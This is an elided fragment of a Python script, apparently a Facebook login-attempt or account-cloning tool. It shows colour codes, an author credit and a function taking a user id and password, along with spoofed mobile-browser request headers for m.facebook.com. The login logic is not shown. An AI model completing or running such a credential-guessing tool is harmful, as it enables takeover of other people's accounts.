...
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
### WARNA RANDOM ####JUBU(JUBU the NOOB)(MD NASRALLAH JUBAIR)
...
def c(uid,pwx,tl):
    ...
    'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://m.facebook.com/error/index.php?err=ec&kerr=1357032&kerr_summary=Something%20Went%20Wrong&kerr_description=Please%20try%20refreshing%20the%20page%20or%20closing%20and%20re-opening%20your%20browser%20window.',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
